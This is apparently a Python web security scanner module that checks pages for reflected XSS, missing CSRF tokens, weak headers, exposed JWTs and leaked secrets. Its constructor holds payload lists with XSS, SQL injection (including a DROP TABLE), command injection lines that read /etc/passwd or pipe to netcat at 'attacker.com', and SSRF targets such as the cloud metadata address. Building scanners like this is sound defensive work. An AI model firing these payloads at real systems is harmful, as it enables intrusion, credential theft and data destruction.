"""Security testing module - Burp Suite style features."""

import re
import json
from typing import List, Dict, Any, Optional, Tuple
from urllib.parse import urlencode, parse_qs, urlparse


class SecurityScanner:
    """Security vulnerability scanner."""
    
    def __init__(self, auto_attack: bool = False):
        self.auto_attack = auto_attack
        self.findings: List[Dict[str, Any]] = []
        
        # Payload libraries
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<meter onmouseover=alert('XSS')>",
        ]
        
        self.sqli_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT * FROM users--",
            "1' AND 1=1--",
            "1' AND 1=2--",
            "' AND SLEEP(5)--",
            "' AND pg_sleep(5)--",
            "' WAITFOR DELAY '0:0:5'--",
            "1; DROP TABLE users--",
            "' OR 'x'='x",
            "\" OR \"1\"=\"1",
            "') OR ('1'='1",
        ]
        
        self.command_payloads = [
            "; cat /etc/passwd",
            "; id",
            "; whoami",
            "| cat /etc/passwd",
            "`whoami`",
            "$(id)",
            "; ping -c 1 attacker.com",
            "| nc attacker.com 4444",
        ]
        
        self.ssrf_payloads = [
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://localhost:22",
            "http://127.0.0.1:3306",  # MySQL
            "http://127.0.0.1:5432",  # PostgreSQL
            "http://127.0.0.1:6379",  # Redis
            "file:///etc/passwd",
        ]
    
    def scan(self, url: str, headers: Dict[str, str], body: str, forms: List[Dict]) -> List[Dict[str, Any]]:
        """Scan a page for vulnerabilities."""
        findings = []
        
        # Check for reflected XSS
        xss_findings = self._check_reflected_xss(url, body)
        findings.extend(xss_findings)
        
        # Check for forms
        for form in forms:
            form_findings = self._scan_form(url, form)
            findings.extend(form_findings)
        
        # Check for interesting headers
        header_findings = self._check_headers(headers)
        findings.extend(header_findings)
        
        # Check for JWT
        jwt_findings = self._check_jwt(body, headers)
        findings.extend(jwt_findings)
        
        # Check for exposed sensitive files
        sensitive_findings = self._check_sensitive_exposure(body)
        findings.extend(sensitive_findings)
        
        self.findings.extend(findings)
        return findings
    
    def _check_reflected_xss(self, url: str, body: str) -> List[Dict[str, Any]]:
        """Check for reflected XSS vulnerabilities."""
        findings = []
        
        # Check if URL parameters are reflected
        parsed = urlparse(url)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param, values in params.items():
                for value in values:
                    # Check if parameter value is reflected without encoding
                    if value in body and len(value) > 3:
                        # Check if it's in a dangerous context
                        if self._is_dangerous_context(body, value):
                            findings.append({
                                "type": "XSS",
                                "severity": "High",
                                "parameter": param,
                                "evidence": f"Parameter '{param}' reflected in response",
                                "url": url,
                                "remediation": "Encode output, use Content Security Policy"
                            })
        
        return findings
    
    def _is_dangerous_context(self, body: str, value: str) -> bool:
        """Check if reflected value is in a dangerous context."""
        index = body.find(value)
        if index == -1:
            return False
        
        # Check surrounding context
        start = max(0, index - 50)
        end = min(len(body), index + len(value) + 50)
        context = body[start:end]
        
        dangerous_patterns = [
            r'<[^>]*$',  # Inside a tag
            r'<script[^>]*>.*$',  # Inside script tag
            r'on\w+=["\']?$',  # Inside event handler
            r'javascript:',  # JavaScript context
        ]
        
        for pattern in dangerous_patterns:
            if re.search(pattern, context, re.IGNORECASE):
                return True
        
        return False
    
    def _scan_form(self, page_url: str, form: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Scan a form for vulnerabilities."""
        findings = []
        
        # Check for CSRF protection
        has_csrf = any(
            inp.get("name", "").lower() in ["csrf", "token", "_token"]
            for inp in form.get("inputs", [])
        )
        
        if not has_csrf and form.get("method") == "POST":
            findings.append({
                "type": "CSRF",
                "severity": "Medium",
                "form_action": form.get("action"),
                "evidence": "Form lacks CSRF token",
                "url": page_url,
                "remediation": "Add CSRF token to form"
            })
        
        # Check for autocomplete on sensitive fields
        for inp in form.get("inputs", []):
            if inp.get("type") in ["password", "token", "secret"]:
                findings.append({
                    "type": "Sensitive Field",
                    "severity": "Info",
                    "field": inp.get("name"),
                    "evidence": f"Sensitive field '{inp.get('name')}' found",
                    "url": page_url,
                })
        
        return findings
    
    def _check_headers(self, headers: Dict[str, str]) -> List[Dict[str, Any]]:
        """Check security headers."""
        findings = []
        
        security_headers = {
            "Content-Security-Policy": "CSP",
            "X-Frame-Options": "Clickjacking protection",
            "X-Content-Type-Options": "MIME sniffing protection",
            "Strict-Transport-Security": "HSTS",
            "X-XSS-Protection": "XSS filter",
            "Referrer-Policy": "Referrer control",
            "Permissions-Policy": "Feature policy",
        }
        
        headers_lower = {k.lower(): v for k, v in headers.items()}
        
        for header, description in security_headers.items():
            if header.lower() not in headers_lower:
                findings.append({
                    "type": "Missing Security Header",
                    "severity": "Low",
                    "header": header,
                    "description": description,
                    "evidence": f"{header} header not present",
                    "remediation": f"Add {header} header"
                })
        
        # Check for information disclosure
        server = headers.get("Server", "")
        if server and server != "":
            findings.append({
                "type": "Information Disclosure",
                "severity": "Info",
                "header": "Server",
                "evidence": f"Server: {server}",
                "remediation": "Remove or obfuscate Server header"
            })
        
        # Check for CORS misconfiguration
        cors = headers.get("Access-Control-Allow-Origin", "")
        if cors == "*":
            findings.append({
                "type": "CORS Misconfiguration",
                "severity": "Medium",
                "evidence": "Access-Control-Allow-Origin: *",
                "remediation": "Restrict CORS to specific origins"
            })
        
        return findings
    
    def _check_jwt(self, body: str, headers: Dict[str, str]) -> List[Dict[str, Any]]:
        """Check for JWT tokens and issues."""
        findings = []
        
        # JWT pattern
        jwt_pattern = r'eyJ[a-zA-Z0-9_-]*\.eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*'
        
        # Search in body and headers
        text_to_search = body + " " + str(headers)
        
        matches = re.findall(jwt_pattern, text_to_search)
        for match in matches:
            findings.append({
                "type": "JWT Exposure",
                "severity": "High",
                "token_preview": match[:50] + "...",
                "evidence": "JWT token found in response",
                "remediation": "Don't expose JWT tokens in client-side code"
            })
        
        return findings
    
    def _check_sensitive_exposure(self, body: str) -> List[Dict[str, Any]]:
        """Check for exposed sensitive data."""
        findings = []
        
        patterns = {
            "API Key": r'[a-zA-Z0-9_-]{32,}',
            "AWS Key": r'AKIA[0-9A-Z]{16}',
            "Private Key": r'-----BEGIN (RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----',
            "Password": r'password["\']?\s*[:=]\s*["\'][^"\']+["\']',
            "Secret": r'secret["\']?\s*[:=]\s*["\'][^"\']+["\']',
            "Email": r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            "IP Address": r'\b(?:\d{1,3}\.){3}\d{1,3}\b',
        }
        
        for name, pattern in patterns.items():
            matches = re.findall(pattern, body)
            if matches:
                findings.append({
                    "type": "Sensitive Data Exposure",
                    "severity": "High" if name in ["Private Key", "AWS Key", "API Key"] else "Medium",
                    "data_type": name,
                    "count": len(matches),
                    "evidence": f"Found {len(matches)} potential {name}(s)",
                    "remediation": "Remove sensitive data from client-side code"
                })
        
        return findings
    
    def generate_report(self) -> Dict[str, Any]:
        """Generate security scan report."""
        severity_counts = {"Critical": 0, "High": 0, "Medium": 0, "Low": 0, "Info": 0}
        
        for finding in self.findings:
            sev = finding.get("severity", "Info")
            severity_counts[sev] = severity_counts.get(sev, 0) + 1
        
        return {
            "total_findings": len(self.findings),
            "severity_breakdown": severity_counts,
            "findings": self.findings,
        }
